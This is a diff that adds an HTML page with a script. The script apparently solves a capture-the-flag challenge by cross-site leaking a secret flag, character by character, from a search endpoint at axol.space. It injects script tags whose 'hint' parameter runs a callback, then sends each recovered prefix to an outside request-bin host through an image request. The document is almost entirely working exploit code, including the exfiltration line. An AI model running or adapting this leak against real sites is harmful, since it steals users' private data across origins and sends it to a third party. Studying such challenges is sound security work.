@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+</head>
+
+<body>
+    <script>
+        const sleep = ms => new Promise(r => setTimeout(r, ms));
+        let alpha = 'etoanihsrdluc_-0123456789gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ!~@#$%^*()+'
+
+
+        function charNotFound(c) {
+            window.arr = window.arr.filter(item => item !== c);
+        }
+
+        async function leak(flag) {
+            window.arr = alpha.split('');
+            for (let c of alpha) {
+                let script = document.createElement('script');
+                script.src = `https://axol.space/search?query=${encodeURIComponent(flag + c)}&hint=charNotFound("${encodeURIComponent(c)}")`;
+                document.head.appendChild(script);
+            }
+
+            while (window.arr.length !== 1) {
+                await sleep(100);
+            }
+
+            return window.arr.pop();
+        }
+
+        async function main() {
+            let flag = '';
+            while (1) {
+                flag += await leak(flag);
+                console.log(flag);
+                new Image().src = 'https://eno2lllwbemj8.x.pipedream.net/bios/?' + encodeURIComponent(flag);
+            }
+        }
+
+        main();
+    </script>
+</body>
+
+</html>
